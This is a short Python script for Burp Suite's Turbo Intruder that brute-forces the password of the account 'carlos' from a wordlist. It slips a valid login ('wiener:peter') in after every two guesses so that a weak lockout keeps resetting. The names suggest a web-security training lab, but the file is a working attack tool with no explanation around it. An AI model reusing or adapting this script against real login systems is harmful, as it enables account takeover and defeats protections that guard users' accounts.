#This script is for bypassing weak account lockouts that revalidates a session once a legitimate account has logged in
def queueRequests(target, wordlists):
    # Create a request engine with specific parameters
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,  # Set the number of concurrent connections
                           requestsPerConnection=1,  # Set the number of requests per connection
                           pipeline=False  # Disable HTTP pipelining
                           )

    # Read the password list from a file
    with open('/Users/duffy/Desktop/passwords.txt') as password_file:
        passwords = password_file.read().splitlines()

    # Iterate over the password list and send requests with the appropriate payloads
    counter = 0
    for password in passwords:
        if (counter % 2) == 0 and counter > 0:  # Send the working credentials (wiener:peter) after every 2 password attempts
            engine.queue(target.req, 'username=wiener&password=peter')
        
        # Send the request with the "carlos" username and the current password from the password list
        engine.queue(target.req, 'username=carlos&password='+password)
        counter += 1

def handleResponse(req, interesting):
    # If the response is interesting (e.g., based on status code, content, etc.), add it to the results table
    if interesting:
        table.add(req)
